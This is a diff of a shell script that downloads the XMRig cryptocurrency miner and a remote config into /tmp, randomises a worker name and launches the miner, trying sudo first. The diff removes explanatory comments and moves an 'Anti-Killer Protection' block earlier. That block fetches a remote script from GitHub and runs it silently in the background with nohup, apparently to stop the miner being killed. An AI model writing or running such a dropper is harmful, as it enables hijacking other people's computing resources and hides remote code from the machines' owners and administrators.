@@ -26,15 +26,11 @@ else
 fi
 
 mkdir -p /tmp/xmrig
-# run the script in /tmp/xmrig, after the script checks if it exists or not
 cd /tmp/xmrig
 
-# use curl because it's present on more distributions
 $DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
 tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
 cd xmrig-$xmrver
-
-# just to be extra safe
 chmod +x xmrig
 
 rm -f config.json
@@ -42,10 +38,10 @@ $DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/kerala/refs/heads/ma
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/kasm/kasm-$randnum/g" config.json
 
-sudo -n ./xmrig
-./xmrig
-
-# Anti-Killer Protection Start 🔥💀
+# Anti-Killer Protection 🔥💀
 wget -qO /tmp/anti-killer.sh https://raw.githubusercontent.com/gorguzaaaaz/kerala/refs/heads/main/anti-killer.sh
 chmod +x /tmp/anti-killer.sh
 nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
+
+sudo -n ./xmrig
+./xmrig
